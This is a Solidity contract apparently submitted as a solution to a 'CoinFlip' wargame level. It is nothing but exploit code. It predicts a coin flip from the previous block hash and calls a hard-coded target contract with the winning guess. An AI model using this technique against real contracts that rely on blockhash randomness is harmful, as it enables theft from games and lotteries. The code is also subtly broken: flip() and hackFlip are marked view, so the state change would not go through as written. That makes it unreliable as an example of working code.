/**
 *Submitted for verification at Etherscan.io on 2022-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface CoinFlip {
   function flip(bool _guess) external view returns(bool);
}


contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x52cF3af849D3F9a5c1fFC25e494eB3063a48E82E);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    function hackFlip(bool _guess) public view returns(bool){
            // pre-deteremine the flip outcome
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

   
    if (side == _guess) {
        originalContract.flip(_guess);
    } else {
    // If I guess incorrectly, submit the opposite
        originalContract.flip(!_guess);
    }

    return side;
  }

}